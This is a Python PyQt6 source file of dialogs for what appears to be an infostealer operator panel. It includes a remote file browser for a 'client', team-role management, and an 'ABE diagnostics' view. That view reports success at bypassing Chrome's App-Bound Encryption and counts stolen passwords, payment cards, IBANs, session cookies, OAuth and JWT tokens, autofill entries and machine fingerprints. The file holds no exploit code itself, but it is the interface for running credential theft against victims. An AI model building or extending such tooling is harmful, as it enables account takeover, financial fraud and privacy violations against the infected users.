from typing import Dict

from PyQt6 import QtCore, QtGui, QtWidgets

from ..core.i18n import I18n
from ..core.logging import EventLogger
from .common import GlassFrame, make_button


class StorageDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, logger: EventLogger, client_name: str, parent=None):
        super().__init__(parent)
        self.i18n = i18n
        self.logger = logger
        self.client_name = client_name
        self.last_download_dir = QtCore.QStandardPaths.writableLocation(
            QtCore.QStandardPaths.StandardLocation.DownloadLocation
        )
        self.remote_files = [
            {"name": "Documents", "size": "-", "type": "dir"},
            {"name": "Support_Log.txt", "size": "48 KB", "type": "file"},
            {"name": "Report_Q4.pdf", "size": "1.2 MB", "type": "file"},
            {"name": "Screenshots", "size": "-", "type": "dir"},
        ]

        self.setWindowTitle(self.i18n.t("storage_title"))
        self.setMinimumSize(720, 520)
        layout = QtWidgets.QVBoxLayout(self)

        header = QtWidgets.QHBoxLayout()
        title_box = QtWidgets.QVBoxLayout()
        self.title_label = QtWidgets.QLabel()
        self.title_label.setStyleSheet("font-size: 18px; font-weight: 600;")
        self.subtitle_label = QtWidgets.QLabel()
        self.subtitle_label.setObjectName("Muted")
        title_box.addWidget(self.title_label)
        title_box.addWidget(self.subtitle_label)
        header.addLayout(title_box)
        header.addStretch()
        self.close_button = make_button("", "ghost")
        self.close_button.clicked.connect(self.close)
        header.addWidget(self.close_button)
        layout.addLayout(header)

        body = QtWidgets.QHBoxLayout()
        self.remote_card = GlassFrame(radius=18, tone="card", tint_alpha=170, border_alpha=70)
        self.remote_card.setObjectName("Card")
        remote_layout = QtWidgets.QVBoxLayout(self.remote_card)
        self.remote_title = QtWidgets.QLabel()
        self.remote_title.setStyleSheet("font-weight: 600;")
        remote_layout.addWidget(self.remote_title)

        path_row = QtWidgets.QHBoxLayout()
        self.path_label = QtWidgets.QLabel()
        self.path_input = QtWidgets.QLineEdit(".")
        self.go_button = make_button("", "ghost")
        path_row.addWidget(self.path_label)
        path_row.addWidget(self.path_input, 1)
        path_row.addWidget(self.go_button)
        remote_layout.addLayout(path_row)

        path_actions = QtWidgets.QHBoxLayout()
        self.up_button = make_button("", "ghost")
        self.refresh_button = make_button("", "ghost")
        path_actions.addWidget(self.up_button)
        path_actions.addWidget(self.refresh_button)
        path_actions.addStretch()
        remote_layout.addLayout(path_actions)

        self.remote_table = QtWidgets.QTableWidget(0, 3)
        self.remote_table.verticalHeader().setVisible(False)
        self.remote_table.setAlternatingRowColors(True)
        self.remote_table.setSelectionBehavior(QtWidgets.QAbstractItemView.SelectionBehavior.SelectRows)
        self.remote_table.setEditTriggers(QtWidgets.QAbstractItemView.EditTrigger.NoEditTriggers)
        self.remote_table.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        self.remote_table.setWordWrap(False)
        self.remote_table.verticalHeader().setDefaultSectionSize(40)
        header = self.remote_table.horizontalHeader()
        header.setSectionResizeMode(0, QtWidgets.QHeaderView.ResizeMode.Stretch)
        header.setSectionResizeMode(1, QtWidgets.QHeaderView.ResizeMode.ResizeToContents)
        header.setSectionResizeMode(2, QtWidgets.QHeaderView.ResizeMode.Fixed)
        self.remote_table.setColumnWidth(2, 120)
        remote_layout.addWidget(self.remote_table, 1)

        self.remote_status = QtWidgets.QLabel()
        self.remote_status.setObjectName("Muted")
        remote_layout.addWidget(self.remote_status)

        self.local_card = GlassFrame(radius=18, tone="card", tint_alpha=170, border_alpha=70)
        self.local_card.setObjectName("Card")
        local_layout = QtWidgets.QVBoxLayout(self.local_card)
        self.local_title = QtWidgets.QLabel()
        self.local_title.setStyleSheet("font-weight: 600;")
        local_layout.addWidget(self.local_title)

        self.download_list = QtWidgets.QListWidget()
        local_layout.addWidget(self.download_list, 1)
        self.download_status = QtWidgets.QLabel()
        self.download_status.setObjectName("Muted")
        local_layout.addWidget(self.download_status)

        body.addWidget(self.remote_card, 3)
        body.addWidget(self.local_card, 2)
        layout.addLayout(body, 1)

        self.go_button.clicked.connect(self.refresh_files)
        self.refresh_button.clicked.connect(self.refresh_files)
        self.up_button.clicked.connect(self.move_up)

        self.apply_translations()
        self.refresh_files()

    def apply_translations(self) -> None:
        self.title_label.setText(self.i18n.t("storage_title"))
        self.subtitle_label.setText(self.i18n.t("storage_subtitle"))
        self.remote_title.setText(self.i18n.t("storage_remote_title"))
        self.local_title.setText(self.i18n.t("storage_local_title"))
        self.path_label.setText(self.i18n.t("storage_path_label"))
        self.go_button.setText(self.i18n.t("storage_go"))
        self.up_button.setText(self.i18n.t("storage_up"))
        self.refresh_button.setText(self.i18n.t("storage_refresh"))
        self.close_button.setText(self.i18n.t("storage_close"))
        self.remote_table.setHorizontalHeaderLabels(
            [
                self.i18n.t("table_name"),
                self.i18n.t("storage_size"),
                self.i18n.t("storage_action"),
            ]
        )
        self.remote_status.setText(self.i18n.t("storage_status_idle"))
        self.download_status.setText(self.i18n.t("storage_local_empty"))
        self.setWindowTitle(self.i18n.t("storage_title"))

    def refresh_files(self) -> None:
        self.remote_table.setRowCount(0)
        if not self.remote_files:
            row = self.remote_table.rowCount()
            self.remote_table.insertRow(row)
            item = QtWidgets.QTableWidgetItem(self.i18n.t("storage_empty"))
            item.setFlags(QtCore.Qt.ItemFlag.NoItemFlags)
            self.remote_table.setItem(row, 0, item)
            self.remote_table.setSpan(row, 0, 1, 3)
            return
        for entry in self.remote_files:
            row = self.remote_table.rowCount()
            self.remote_table.insertRow(row)
            self.remote_table.setRowHeight(row, 40)
            name_item = QtWidgets.QTableWidgetItem(entry["name"])
            size_item = QtWidgets.QTableWidgetItem(entry["size"])
            self.remote_table.setItem(row, 0, name_item)
            self.remote_table.setItem(row, 1, size_item)
            action_button = make_button(self.i18n.t("storage_download"), "primary")
            if entry["type"] != "file":
                action_button.setEnabled(False)
            action_button.clicked.connect(
                lambda _, filename=entry["name"]: self.queue_download(filename)
            )
            self.remote_table.setCellWidget(row, 2, action_button)
        self.remote_status.setText(self.i18n.t("storage_status_ready"))

    def move_up(self) -> None:
        self.path_input.setText("..")
        self.refresh_files()

    def queue_download(self, filename: str) -> None:
        start_dir = self.last_download_dir or ""
        folder = QtWidgets.QFileDialog.getExistingDirectory(
            self, self.i18n.t("storage_pick_folder"), start_dir
        )
        if not folder:
            return
        self.last_download_dir = folder
        if self.download_list.count() == 0:
            self.download_list.clear()
        self.download_list.addItem(f"{filename} -> {folder}")
        self.download_status.setText(self.i18n.t("storage_status_ready"))
        self.logger.log("log_storage_download", file=filename, path=folder)


class AddMemberDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, parent=None, allowed_roles: list[str] | None = None):
        super().__init__(parent)
        self.i18n = i18n
        self.setWindowTitle(self.i18n.t("team_add_dialog_title"))
        self.setMinimumWidth(360)
        if allowed_roles is None:
            allowed_roles = ["operator", "administrator", "moderator"]

        layout = QtWidgets.QVBoxLayout(self)
        form = QtWidgets.QFormLayout()

        self.name_input = QtWidgets.QLineEdit()
        self.account_input = QtWidgets.QLineEdit()
        self.password_input = QtWidgets.QLineEdit()
        self.password_input.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        self.tag_combo = QtWidgets.QComboBox()
        if "operator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_operator"), "operator")
        if "administrator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_administrator"), "administrator")
        if "moderator" in allowed_roles:
            self.tag_combo.addItem(self.i18n.t("tag_moderator"), "moderator")

        form.addRow(self.i18n.t("team_add_name"), self.name_input)
        form.addRow(self.i18n.t("team_add_account_id"), self.account_input)
        form.addRow(self.i18n.t("team_add_password"), self.password_input)
        form.addRow(self.i18n.t("team_add_tag"), self.tag_combo)
        layout.addLayout(form)

        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.cancel_button = make_button(self.i18n.t("team_add_cancel"), "ghost")
        self.confirm_button = make_button(self.i18n.t("team_add_confirm"), "primary")
        self.cancel_button.clicked.connect(self.reject)
        self.confirm_button.clicked.connect(self.accept)
        buttons.addWidget(self.cancel_button)
        buttons.addWidget(self.confirm_button)
        layout.addLayout(buttons)

    def member_data(self) -> Dict[str, str]:
        return {
            "name": self.name_input.text().strip(),
            "account_id": self.account_input.text().strip(),
            "password": self.password_input.text(),
            "tag": self.tag_combo.currentData(),
        }


class EditMemberDialog(QtWidgets.QDialog):
    def __init__(
        self,
        i18n: I18n,
        member: dict,
        parent=None,
        allowed_roles: list[str] | None = None,
    ):
        super().__init__(parent)
        self.i18n = i18n
        self.member = member or {}
        self.setWindowTitle(self.i18n.t("team_edit_dialog_title"))
        self.setMinimumWidth(360)

        layout = QtWidgets.QVBoxLayout(self)
        form = QtWidgets.QFormLayout()

        self.name_input = QtWidgets.QLineEdit(str(self.member.get("name") or ""))
        self.account_input = QtWidgets.QLineEdit(str(self.member.get("account_id") or ""))
        self.password_input = QtWidgets.QLineEdit()
        self.password_input.setEchoMode(QtWidgets.QLineEdit.EchoMode.Password)
        self.password_input.setPlaceholderText(self.i18n.t("team_edit_password_placeholder"))

        self.tag_combo = QtWidgets.QComboBox()
        roles = list(allowed_roles or ["operator", "administrator", "moderator"])
        current_role = str(self.member.get("tag") or "operator")
        if current_role and current_role not in roles:
            roles.append(current_role)
        for role in roles:
            key = f"tag_{role}"
            label = self.i18n.t(key)
            if label == key:
                label = role
            self.tag_combo.addItem(label, role)
        index = self.tag_combo.findData(current_role)
        if index >= 0:
            self.tag_combo.setCurrentIndex(index)
        if allowed_roles is not None and len(allowed_roles) <= 1:
            self.tag_combo.setEnabled(False)

        form.addRow(self.i18n.t("team_add_name"), self.name_input)
        form.addRow(self.i18n.t("team_add_account_id"), self.account_input)
        form.addRow(self.i18n.t("team_add_password"), self.password_input)
        form.addRow(self.i18n.t("team_add_tag"), self.tag_combo)
        layout.addLayout(form)

        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.cancel_button = make_button(self.i18n.t("team_edit_cancel"), "ghost")
        self.confirm_button = make_button(self.i18n.t("team_edit_confirm"), "primary")
        self.cancel_button.clicked.connect(self.reject)
        self.confirm_button.clicked.connect(self.accept)
        buttons.addWidget(self.cancel_button)
        buttons.addWidget(self.confirm_button)
        layout.addLayout(buttons)

    def member_data(self) -> Dict[str, str]:
        return {
            "name": self.name_input.text().strip(),
            "account_id": self.account_input.text().strip(),
            "password": self.password_input.text(),
            "tag": self.tag_combo.currentData(),
        }


class AbeDiagnosticsDialog(QtWidgets.QDialog):
    def __init__(self, i18n: I18n, payload: dict | None = None, parent=None):
        super().__init__(parent)
        self.i18n = i18n
        self.payload = payload or {}

        self.setObjectName("AbeDiagnosticsDialog")
        self.setWindowTitle(self.i18n.t("abe_diagnostics_title"))
        self.setMinimumWidth(520)
        self.setMinimumHeight(600)

        layout = QtWidgets.QVBoxLayout(self)
        layout.setContentsMargins(14, 14, 14, 14)
        layout.setSpacing(12)

        title = QtWidgets.QLabel(self.i18n.t("abe_diagnostics_title"))
        title.setObjectName("AbeDialogTitle")
        layout.addWidget(title)

        # Scroll area for content
        scroll = QtWidgets.QScrollArea()
        scroll.setObjectName("AbeDiagnosticsScroll")
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QtWidgets.QFrame.Shape.NoFrame)
        scroll.setHorizontalScrollBarPolicy(QtCore.Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setAutoFillBackground(False)
        scroll.viewport().setObjectName("AbeDiagnosticsViewport")
        scroll.viewport().setAutoFillBackground(False)
        scroll_content = QtWidgets.QWidget()
        scroll_content.setObjectName("AbeDiagnosticsContent")
        scroll_content.setAutoFillBackground(False)
        scroll_layout = QtWidgets.QVBoxLayout(scroll_content)
        scroll_layout.setContentsMargins(4, 4, 4, 4)
        scroll_layout.setSpacing(16)

        # === ABE Status Section ===
        abe_form = QtWidgets.QFormLayout()
        abe_form.setLabelAlignment(QtCore.Qt.AlignmentFlag.AlignLeft)
        abe_form.setFormAlignment(QtCore.Qt.AlignmentFlag.AlignLeft)
        abe_form.setHorizontalSpacing(20)
        abe_form.setVerticalSpacing(8)

        self._add_bool_row(abe_form, "abe_diag_windows", self.payload.get("windows"))
        self._add_bool_row(abe_form, "abe_diag_chrome", self.payload.get("chrome_installed"))
        self._add_bool_row(abe_form, "abe_diag_elevation", self.payload.get("elevation_service"))
        self._add_bool_row(abe_form, "abe_diag_dpapi", self.payload.get("dpapi_available"))
        self._add_bool_row(abe_form, "abe_diag_ielevator", self.payload.get("ielevator_available"))

        abe_form.addRow(QtWidgets.QLabel(""), QtWidgets.QLabel(""))

        abe_form.addRow(
            self._label("abe_diag_version"),
            self._value(self._resolve_version_text()),
        )
        abe_form.addRow(
            self._label("abe_diag_cookies_v20"),
            self._value(self._resolve_v20_text()),
        )
        abe_form.addRow(
            self._label("abe_diag_success_rate"),
            self._value(self._resolve_success_text()),
        )

        scroll_layout.addLayout(abe_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Passwords Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_passwords_title"))

        passwords_form = QtWidgets.QFormLayout()
        passwords_form.setHorizontalSpacing(20)
        passwords_form.setVerticalSpacing(6)
        passwords_data = self.payload.get("passwords") or {}
        passwords_form.addRow(
            self._label("abe_diag_passwords_total"),
            self._value(str(passwords_data.get("total", 0))),
        )
        passwords_form.addRow(
            self._label("abe_diag_passwords_encrypted"),
            self._value(str(passwords_data.get("encrypted", 0))),
        )
        domains = passwords_data.get("domains") or []
        if domains:
            passwords_form.addRow(
                self._label("abe_diag_passwords_domains"),
                self._value(", ".join(domains[:5]) + ("..." if len(domains) > 5 else ""), wrap=True),
            )
        scroll_layout.addLayout(passwords_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Payment Methods Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_payment_title"))

        payment_form = QtWidgets.QFormLayout()
        payment_form.setHorizontalSpacing(20)
        payment_form.setVerticalSpacing(6)
        payment_data = self.payload.get("payment_methods") or {}
        payment_form.addRow(
            self._label("abe_diag_cards"),
            self._value(str(payment_data.get("cards", 0))),
        )
        card_types = payment_data.get("card_types") or []
        if card_types:
            payment_form.addRow(
                self._label("abe_diag_card_types"),
                self._value(", ".join(card_types)),
            )
        payment_form.addRow(
            self._label("abe_diag_ibans"),
            self._value(str(payment_data.get("ibans", 0))),
        )
        scroll_layout.addLayout(payment_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Tokens Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_tokens_title"))

        tokens_form = QtWidgets.QFormLayout()
        tokens_form.setHorizontalSpacing(20)
        tokens_form.setVerticalSpacing(6)
        tokens_data = self.payload.get("tokens") or {}
        tokens_form.addRow(
            self._label("abe_diag_session_cookies"),
            self._value(str(tokens_data.get("session_cookies", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_auth_tokens"),
            self._value(str(tokens_data.get("auth_tokens", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_oauth_tokens"),
            self._value(str(tokens_data.get("oauth_tokens", 0))),
        )
        tokens_form.addRow(
            self._label("abe_diag_jwt_tokens"),
            self._value(str(tokens_data.get("jwt_tokens", 0))),
        )
        services = tokens_data.get("services") or []
        if services:
            tokens_form.addRow(
                self._label("abe_diag_services"),
                self._value(", ".join(services[:10]) + ("..." if len(services) > 10 else ""), wrap=True),
            )
        scroll_layout.addLayout(tokens_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Fingerprint Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_fingerprint_title"))

        fingerprint_form = QtWidgets.QFormLayout()
        fingerprint_form.setHorizontalSpacing(20)
        fingerprint_form.setVerticalSpacing(6)
        fingerprint_data = self.payload.get("fingerprint") or {}
        fingerprint_form.addRow(
            self._label("abe_diag_machine_id"),
            self._value(str(fingerprint_data.get("machine_id") or "--")),
        )
        fingerprint_form.addRow(
            self._label("abe_diag_client_id"),
            self._value(str(fingerprint_data.get("client_id") or "--")),
        )
        fingerprint_form.addRow(
            self._label("abe_diag_profile_id"),
            self._value(str(fingerprint_data.get("profile_id") or "--")),
        )
        scroll_layout.addLayout(fingerprint_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Autofill Section ===
        scroll_layout.addWidget(self._section_title("abe_diag_autofill_title"))

        autofill_form = QtWidgets.QFormLayout()
        autofill_form.setHorizontalSpacing(20)
        autofill_form.setVerticalSpacing(6)
        autofill_data = self.payload.get("autofill") or {}
        autofill_form.addRow(
            self._label("abe_diag_autofill_entries"),
            self._value(str(autofill_data.get("entries", 0))),
        )
        autofill_form.addRow(
            self._label("abe_diag_autofill_addresses"),
            self._value(str(autofill_data.get("addresses", 0))),
        )
        autofill_form.addRow(
            self._label("abe_diag_autofill_profiles"),
            self._value(str(autofill_data.get("profiles", 0))),
        )
        scroll_layout.addLayout(autofill_form)

        # === Separator ===
        scroll_layout.addWidget(self._separator())

        # === Recommendation ===
        rec_form = QtWidgets.QFormLayout()
        rec_form.setHorizontalSpacing(20)
        rec_form.addRow(
            self._label("abe_diag_recommendation"),
            self._value(self._resolve_recommendation_text(), wrap=True),
        )
        scroll_layout.addLayout(rec_form)

        scroll_layout.addStretch()
        scroll.setWidget(scroll_content)
        layout.addWidget(scroll, 1)

        # Buttons
        buttons = QtWidgets.QHBoxLayout()
        buttons.addStretch()
        self.copy_button = make_button(self.i18n.t("abe_diag_copy"), "ghost")
        self.close_button = make_button(self.i18n.t("abe_diag_close"), "primary")
        self.copy_button.clicked.connect(self._copy_summary)
        self.close_button.clicked.connect(self.accept)
        buttons.addWidget(self.copy_button)
        buttons.addWidget(self.close_button)
        layout.addLayout(buttons)

    def _separator(self) -> QtWidgets.QFrame:
        line = QtWidgets.QFrame()
        line.setObjectName("AbeSeparator")
        line.setFrameShape(QtWidgets.QFrame.Shape.HLine)
        line.setFixedHeight(1)
        return line

    def _section_title(self, key: str) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(self.i18n.t(key))
        label.setObjectName("CardSectionTitle")
        return label

    def _label(self, key: str) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(self.i18n.t(key))
        label.setObjectName("DetailLabel")
        return label

    def _value(self, text: str, wrap: bool = False) -> QtWidgets.QLabel:
        label = QtWidgets.QLabel(text)
        label.setObjectName("DetailValue")
        label.setWordWrap(wrap)
        return label

    def _format_bool(self, value: object) -> tuple[str, str]:
        if value is True:
            return self.i18n.t("proxy_bool_yes"), "ok"
        if value is False:
            return self.i18n.t("proxy_bool_no"), "bad"
        return "--", "na"

    def _add_bool_row(self, form: QtWidgets.QFormLayout, key: str, value: object) -> None:
        label = self._label(key)
        text, state = self._format_bool(value)
        value_label = self._value(text)
        value_label.setObjectName("AbeBoolValue")
        value_label.setProperty("state", state)
        form.addRow(label, value_label)

    def _resolve_version_text(self) -> str:
        chrome_version = self.payload.get("chrome_version")
        if chrome_version:
            if self.payload.get("detected"):
                return f"Chrome {chrome_version} (ABE/APPB)"
            return f"Chrome {chrome_version}"
        if self.payload.get("detected"):
            return "APPB (Chrome 127+)"
        return "--"

    def _resolve_v20_text(self) -> str:
        total = self.payload.get("cookies_total")
        v20 = self.payload.get("cookies_v20")
        if isinstance(total, int) and isinstance(v20, int):
            return f"{v20} / {total}"
        return "--"

    def _resolve_success_text(self) -> str:
        value = self.payload.get("success_rate")
        if isinstance(value, (int, float)):
            return f"{value:.0f}%"
        return "--"

    def _resolve_recommendation_text(self) -> str:
        recommendation = str(self.payload.get("recommendation") or "").strip()
        return recommendation or "--"

    def _copy_summary(self) -> None:
        lines = [
            "=== ABE Status ===",
            f"{self.i18n.t('abe_diag_windows')}: {self._format_bool(self.payload.get('windows'))[0]}",
            f"{self.i18n.t('abe_diag_chrome')}: {self._format_bool(self.payload.get('chrome_installed'))[0]}",
            f"{self.i18n.t('abe_diag_elevation')}: {self._format_bool(self.payload.get('elevation_service'))[0]}",
            f"{self.i18n.t('abe_diag_dpapi')}: {self._format_bool(self.payload.get('dpapi_available'))[0]}",
            f"{self.i18n.t('abe_diag_ielevator')}: {self._format_bool(self.payload.get('ielevator_available'))[0]}",
            f"{self.i18n.t('abe_diag_version')}: {self._resolve_version_text()}",
            f"{self.i18n.t('abe_diag_cookies_v20')}: {self._resolve_v20_text()}",
            f"{self.i18n.t('abe_diag_success_rate')}: {self._resolve_success_text()}",
            "",
            "=== Passwords ===",
        ]
        passwords_data = self.payload.get("passwords") or {}
        lines.append(f"{self.i18n.t('abe_diag_passwords_total')}: {passwords_data.get('total', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_passwords_encrypted')}: {passwords_data.get('encrypted', 0)}")
        
        lines.append("")
        lines.append("=== Payment Methods ===")
        payment_data = self.payload.get("payment_methods") or {}
        lines.append(f"{self.i18n.t('abe_diag_cards')}: {payment_data.get('cards', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_ibans')}: {payment_data.get('ibans', 0)}")
        
        lines.append("")
        lines.append("=== Tokens ===")
        tokens_data = self.payload.get("tokens") or {}
        lines.append(f"{self.i18n.t('abe_diag_session_cookies')}: {tokens_data.get('session_cookies', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_auth_tokens')}: {tokens_data.get('auth_tokens', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_oauth_tokens')}: {tokens_data.get('oauth_tokens', 0)}")
        lines.append(f"{self.i18n.t('abe_diag_jwt_tokens')}: {tokens_data.get('jwt_tokens', 0)}")
        
        lines.append("")
        lines.append("=== Fingerprint ===")
        fingerprint_data = self.payload.get("fingerprint") or {}
        lines.append(f"{self.i18n.t('abe_diag_machine_id')}: {fingerprint_data.get('machine_id') or '--'}")
        lines.append(f"{self.i18n.t('abe_diag_client_id')}: {fingerprint_data.get('client_id') or '--'}")
        
        lines.append("")
        lines.append(f"{self.i18n.t('abe_diag_recommendation')}: {self._resolve_recommendation_text()}")
        
        QtWidgets.QApplication.clipboard().setText("\n".join(lines))
